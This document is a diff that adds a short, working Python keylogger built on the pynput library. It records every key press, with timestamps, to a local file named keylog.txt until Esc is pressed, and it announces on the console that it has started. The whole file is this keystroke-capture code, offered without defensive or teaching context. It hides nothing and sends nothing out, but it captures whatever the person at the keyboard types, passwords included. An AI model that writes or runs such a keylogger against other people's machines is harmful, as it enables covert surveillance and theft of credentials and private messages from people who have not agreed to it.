@@ -1,0 +1,25 @@
+from pynput import keyboard
+import logging
+
+# Set up logging to save keystrokes to a file
+logging.basicConfig(filename="keylog.txt", level=logging.INFO, format='%(asctime)s: %(message)s')
+
+# Function to handle key press events
+def on_press(key):
+    try:
+        # Log the key pressed
+        logging.info(f'{key.char}')  # Log regular character keys
+    except AttributeError:
+        logging.info(f'[{key}]')  # Log special keys
+
+# Function to handle key release events (optional)
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener if Esc is pressed
+        return False
+
+# Start listening to the keyboard events
+if __name__ == "__main__":
+    print("Keylogger started. Press ESC to stop.")
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
